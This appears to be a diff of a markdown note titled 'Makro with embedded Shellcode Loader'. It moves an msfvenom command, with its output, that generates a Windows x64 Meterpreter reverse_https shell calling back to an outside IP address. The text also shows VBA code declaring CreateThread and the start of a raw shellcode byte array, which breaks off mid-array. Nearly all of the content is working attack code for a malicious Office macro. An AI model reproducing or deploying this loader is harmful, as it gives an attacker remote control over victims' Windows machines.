@@ -1,6 +1,11 @@
 Makro with embedded Shellcode Loader
 
-
+    +-$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=51.75.74.249 LPORT=4444 EXITFUNC=thread -f vbapplication
+    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+    [-] No arch selected, selecting arch: x64 from the payload
+    No encoder specified, outputting raw payload
+    Payload size: 725 bytes
+    Final size of vbapplication file: 2429 bytes
 
 ```
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -16,12 +21,7 @@ Function MyMacro()
     Dim data As Long
     Dim res As LongPtr
     
-    +-$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=51.75.74.249 LPORT=4444 EXITFUNC=thread -f vbapplication
-    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-    [-] No arch selected, selecting arch: x64 from the payload
-    No encoder specified, outputting raw payload
-    Payload size: 725 bytes
-    Final size of vbapplication file: 2429 bytes
+
     
     buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 77, 49, 201, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 65, 81, 102, 129, 120, 24, _
     11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 68, 139, 64, 32, 73, 1, 208, 139, 72, 24, 80, 227, 86, 77, 49, 201, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
